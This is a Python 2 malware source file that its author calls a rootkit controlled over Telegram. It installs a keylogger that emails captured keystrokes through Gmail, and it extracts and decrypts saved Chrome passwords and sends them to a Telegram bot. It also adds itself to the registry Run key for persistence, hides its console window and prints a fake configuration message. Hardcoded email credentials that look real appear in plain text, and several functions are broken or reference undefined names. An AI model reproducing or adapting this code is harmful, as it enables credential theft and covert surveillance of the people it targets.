'''
Well this is my attempt at making a kind of rootkit with Telegram as GUI.
Feel free to copy things but you probably could do better than this.

Not all features in this program are working :/
'''

import pythoncom, pyHook
import os
import sys
import platform
import threading
import telepot
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32con
import getpass
import sqlite3
import shutil
import win32crypt
import win32event, win32api, winerror
from _winreg import *
from win32file import GetDriveType
from telepot.loop import MessageLoop

currentuser = getpass.getuser()

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
keyData=''
count=0
bot = telepot.Bot('"PUT API KEY HERE"')
teleID = 'PUT TELEGRAM ID HERE'

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def get_drives_list(drive_types=(win32con.DRIVE_REMOVABLE,)):
    ret = list()
    drives_str = GetLogicalDriveStrings()
    drives = [item for item in drives_str.split("\x00") if item]
    for drive in drives:
        if GetDriveType(drive) in drive_types:
            ret.append(drive[:2])
    return ret

def run():

    database_path = ''
    if 'HOMEDRIVE' in os.environ and 'HOMEPATH' in os.environ:
        path_Win7 = os.environ.get('HOMEDRIVE') + os.environ.get(
            'HOMEPATH') + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data'


        if os.path.exists(path_Win7):
            database_path = path_Win7

        else:
            return
    else:
        return

        # Copy database before to query it (bypass lock errors)
    try:
        shutil.copy(database_path, os.getcwd() + os.sep + 'tmp_db')
        database_path = os.getcwd() + os.sep + 'tmp_db'

    except Exception, e:
        pass

        # Connect to the Database
    try:
        conn = sqlite3.connect(database_path)
        cursor = conn.cursor()
    except Exception, e:
        return

        # Get the results
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except:
        return

    pwdFound = []
    for result in cursor.fetchall():
        values = {}

        try:
            # Decrypt the Password
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception, e:
            password = ''

        if password:
            values['Site'] = result[0]
            values['Username'] = result[1]
            values['Password'] = password
            pwdFound.append(values)

    conn.close()
    if database_path.endswith('tmp_db'):
        os.remove(database_path)

    return pwdFound 
    
    
def usbCopy():
    sheet = client.open('CMD').sheet1
    drives = get_drives_list()
    sheet.update_cell(1,4,"Lijst USBs:")
    i = 2
    for drive in drives:
        folderPath = format(drive)
        fso = com.Dispatch("Scripting.FileSystemObject")
        folder = fso.GetFolder(folderPath)
        MB = 1024 * 1024.0
        sheet.update_cell(i,4,format(drive))
        i + 1
        print(format(drive)),"|",(folder.Size / MB),"MB"


def msg():
    print "Configuring win32, 68%"
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Windows",0,REG_SZ, new_file_path)

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global keyData
            if (len(keyData)>100):
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="diebolo01@gmail.com"#Specify Username Here 
                PASS="Isaac2002"#Specify Password Here
                FROM = USER#From address is taken from username
                TO = ["diebolo01@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+currentuser+str(ts)
                MESSAGE = keyData
                message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    keyData=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)
            
            

def customEmail(customMessage, onderwerp):
    ts = datetime.datetime.now()
    SERVER = "smtp.gmail.com" #Specify Server Here
    PORT = 587 #Specify Port Here
    USER="diebolo01@gmail.com"#Specify Username Here 
    PASS="Isaac2002"#Specify Password Here
    FROM = USER#From address is taken from username
    TO = ["diebolo01@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
    SUBJECT = onderwerp + currentuser + str(ts)
    MESSAGE = customMessage
    message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
    try:
        server = smtplib.SMTP()
        server.connect(SERVER,PORT)
        server.starttls()
        server.login(USER,PASS)
        server.sendmail(FROM, TO, message)
        server.quit()
    except Exception as e:
        print e

def startEmail():
    tem = Chrome()
    a = tem.run()
    customMessage(a,"Keylogger reporting at: ")

def mainMenu():
    global bot
    ts = datetime.datetime.now()
    show_keyboard = {'keyboard': [['USB','Tree','Passwords']]}
    bot.sendMessage(teleID, 'Module deployed. PC naam: '+currentuser+' op '+str(ts) , reply_markup=show_keyboard)
    def handle(msg):
        global bot, run
        content_type, chat_type, chat_id = telepot.glance(msg)
        print(msg['text'], content_type, chat_type, chat_id)
        if content_type == 'text':
            if msg['text'] == 'USB':
                usbCopy()
            elif msg['text'] == 'Tree':
                tree()
            elif msg['text'] == 'Passwords':  
                bot.sendMessage(teleID, 'Bestand genereren...')
                ayy = str(run())
                lala = ayy.replace('}, ', '}\n')
                f = open('pass.txt', 'w+')
                f.write(lala)
                f.close()
                f = open('pass.txt', 'rb')
                bot.sendDocument(teleID, f)
                f.close()
                os.remove('pass.txt')
  
    MessageLoop(bot, handle).run_as_thread()
    

def main():
    global x
    mainMenu()
    exit()
    addStartup() 
    hide()
    startEmail()
    email=TimerClass()
    email.start()    
    return True

if __name__ == '__main__':
    mainMenu()

def keypressed(event):
    global x,keyData
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    keyData=keyData+keys

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
